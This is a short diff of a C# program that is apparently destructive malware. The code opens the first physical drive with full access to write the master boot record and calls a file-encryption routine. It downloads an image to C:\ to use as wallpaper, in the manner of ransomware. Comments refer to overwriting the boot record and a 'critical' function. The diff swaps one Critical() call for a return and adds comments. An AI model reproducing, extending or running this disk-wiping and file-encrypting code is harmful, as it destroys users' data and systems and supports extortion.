@@ -56,7 +56,7 @@ namespace Program
             var mbrData = new byte[MbrSize];
 
             var mbr = CreateFile(
-                "\\\\.\\PhysicalDrive0",
+                "\\\\.\\PhysicalDrive0", // The first sector on the hard drive, where the master boot record is stored.
                 GenericAll,
                 FileShareRead | FileShareWrite,
                 IntPtr.Zero,
@@ -76,8 +76,7 @@ namespace Program
                 out uint lpNumberOfBytesWritten,
                 IntPtr.Zero))
             {
-                Console.WriteLine("Loading...");
-                Critical();
+                return;
             }
             else
             {
@@ -280,7 +279,6 @@ namespace Program
             {
                 // mbrOverWrite(); - Calls the function to overwrite the master boot record
                 // Critical(); - Calls the critical function
-
                 EncryptFile(); // Calls the file encryption function
                 new WebClient().DownloadFile("https://i.imgur.com/wAvU1Km.jpg", @"c:\wAvU1Km.jpg"); // Downloads the picture we want as wallpaper and places it in the c:\ directory
                 Thread.Sleep(2000);
